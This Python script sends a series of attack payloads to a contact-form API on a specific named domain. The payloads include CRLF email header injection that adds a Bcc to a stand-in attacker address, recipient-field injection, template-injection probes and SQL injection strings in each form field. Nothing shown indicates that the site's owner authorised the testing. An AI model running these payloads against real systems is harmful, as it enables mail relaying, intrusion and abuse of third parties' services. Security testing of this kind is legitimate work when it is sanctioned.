import requests, os, time, json
U = open('/work/ua_final.txt').read().strip()
T = "https://www.infinitycapital.bh/api/send"
S = requests.Session()
S.headers.update({'User-Agent': U, 'Accept':'*/*'})

def post(fields, label, files=None, timeout=40):
    t0=time.time()
    try:
        r = S.post(T, data=fields, files=files, timeout=timeout, allow_redirects=False)
        dt=time.time()-t0
        print("%-34s %s %5.2fs %s" % (label, r.status_code, dt, r.text[:220].replace('\n',' ')))
        return r
    except Exception as e:
        print("%-34s ERR %.1fs %s" % (label, time.time()-t0, e)); return None

base = dict(fname='Tester', lname='User', areacode='973', tel='3000000',
            cname='Tester', subject='ICVAPT7', msg='probe message', check='true')

print("### 0. baseline reachability / current quota state")
post(dict(base, targets='not-an-email'), "invalid targets (probe status)")

print("\n### 1. CRLF / email header injection in subject")
for lab, v in [
 ("subject CRLF Bcc", "IC\r\nBcc: attacker@evil-example.com"),
 ("subject LF only",   "IC\nBcc: attacker@evil-example.com"),
 ("subject CRLF+body","IC\r\n\r\nSpam body injected"),
 ("subject encoded",   "IC%0d%0aBcc:%20attacker@evil-example.com"),
]:
    f = dict(base); f['subject']=v; post(dict(f, targets='info@infinitycapital.bh'), lab)

print("\n### 2. CRLF / header injection in targets (recipient field)")
for lab, v in [
 ("targets CRLF",   "info@infinitycapital.bh\r\nBcc: attacker@evil-example.com"),
 ("targets newline","info@infinitycapital.bh\nBcc:attacker@evil-example.com"),
 ("targets comma",  "info@infinitycapital.bh,attacker@evil-example.com"),
]:
    f = dict(base); post(dict(f, targets=v), lab)

print("\n### 3. injection in fname/lname/cname/msg/tel (SSTI, SQLi, CRLF)")
for field in ['fname','lname','cname','msg','tel','areacode']:
    f = dict(base)
    f[field] = "{{7*7}}"
    post(dict(f, targets='info@infinitycapital.bh'), "ssti in %s"%field)
for field in ['fname','lname','cname','msg','tel']:
    f = dict(base)
    f[field] = "x' OR '1'='1"
    post(dict(f, targets='info@infinitycapital.bh'), "sqli in %s"%field)
for field in ['fname','lname','cname','msg']:
    f = dict(base)
    f[field] = "a\r\nX-Injected: yes"
    post(dict(f, targets='info@infinitycapital.bh'), "crlf in %s"%field)
